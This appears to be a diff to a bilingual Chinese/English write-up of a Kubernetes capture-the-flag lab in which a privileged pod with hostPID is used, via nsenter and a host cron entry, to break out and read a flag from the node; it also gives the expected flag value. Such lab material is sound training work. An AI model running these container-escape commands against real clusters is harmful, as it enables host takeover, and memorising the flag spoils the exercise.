@@ -10,34 +10,22 @@
 | 难度 | L2 |
 | 交付方式 | KIND / Kubernetes |
 | 入口 | KIND 集群内入口（无固定宿主端口） |
+| 集群 | cve-k8s-11-privileged |
 
 ## 场景概述
-- 技术：N/A (privileged pod)
-- 难度：L2
-- 交付方式：k8s
-## 攻击路径与利用步骤
 
-## Overview
-| Property | Value |
-|----------|-------|
-| CVE/Technique | N/A (privileged pod) -- privileged: true container |
-| Difficulty | L2 |
-| Type | k8s (KIND cluster) |
-| Cluster Name | cve-k8s-11-privileged |
-| Flag Location | `/host-flag/flag.txt` on the KIND node (not mounted into the pod; host access required) |
-
-## Attack Path Summary
 1. Pod `privileged-pod` runs with `privileged: true` (all capabilities, no isolation)
 2. The pod also runs with `hostPID: true`
 3. Use `nsenter` to enter the host namespace and read the flag
 4. Alternative: mount the host filesystem and read the flag directly
 
-## Prerequisites
+## 前置知识
+
 - kubectl access to KIND cluster `cve-k8s-11-privileged`
 - Pod name: `privileged-pod` (alpine image)
 - Tools inside pod: `nsenter`, `mount`, `cat`
 
-## Step-by-Step Exploitation
+## 利用步骤
 
 ### Step 1: Initial Access
 Exec into the privileged pod:
@@ -108,7 +96,8 @@ nsenter --target 1 --mount -- sh -c "echo '* * * * * root cat /host-flag/flag.tx
   - nsenter: `nsenter --target 1 --mount -- cat /host-flag/flag.txt`
 - Expected output: `flag{k8s-11-default}` (or custom value from `CVE_FLAG`)
 
-## Verification Commands
+## 验证命令
+
 ```bash
 # Verify the scenario is deployed and running
 kubectl get pod privileged-pod
@@ -122,6 +111,10 @@ kubectl exec privileged-pod -- cat /proc/self/status | grep CapEff
 kubectl exec privileged-pod -- nsenter --target 1 --mount -- cat /host-flag/flag.txt
 ```
 
+## Flag
+
+- Flag 位置：`/host-flag/flag.txt` on the KIND node (not mounted into the pod; host access required)
+
 ## 此场景利用了哪些知识
 
 | 规划维度 | 所需知识 |
@@ -133,4 +126,5 @@ kubectl exec privileged-pod -- nsenter --target 1 --mount -- cat /host-flag/flag
 | 验证 | Read the host flag from the privileged context |
 
 ## 修复建议
+
 升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
